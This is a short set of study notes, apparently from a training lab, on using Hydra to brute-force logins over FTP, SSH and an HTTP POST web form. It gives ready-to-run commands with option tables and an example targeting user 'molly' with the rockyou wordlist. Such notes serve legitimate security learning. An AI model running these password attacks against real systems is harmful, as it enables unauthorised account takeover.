Password cracking with hydra
## ssh


Hydra Commands

The options we pass into Hydra depend on which service (protocol) we’re attacking. For example, if we wanted to brute force FTP with the username being user and a password list being passlist.txt, we’d use the following command:

`hydra -l user -P passlist.txt ftp://10.10.125.84`

For this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method). SSH

`hydra -l <username> -P <full path to pass> 10.10.125.84 -t 4 ssh`

|Option|Description|
|---|---|
|`-l`|specifies the (SSH) username for login|
|`-P`|indicates a list of passwords|
|`-t`|sets the number of threads to spawn|

`hydra -l <username> -P <full path to pass> 10.10.125.84 -t 4 ssh`

## [](https://github.com/nxtbz/obsidian_notes/blob/babd6ef6cd34a446508db0212c2c13d5f6d94d3d/TOOLS/hydra.md#webform)webform

|Option|Description|
|---|---|
|`-l`|the username for (web form) login|
|`-P`|the password list to use|
|`http-post-form`|the type of the form is POST|
|`<path>`|the login page URL, for example, `login.php`|
|`<login_credentials>`|the username and password used to log in, for example, `username=^USER^&password=^PASS^`|
|`<invalid_response>`|part of the response when the login fails|
|`-V`|verbose output for every attempt|

`hydra -l <username> -P <wordlist> <IP> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

`hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.125.84 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V`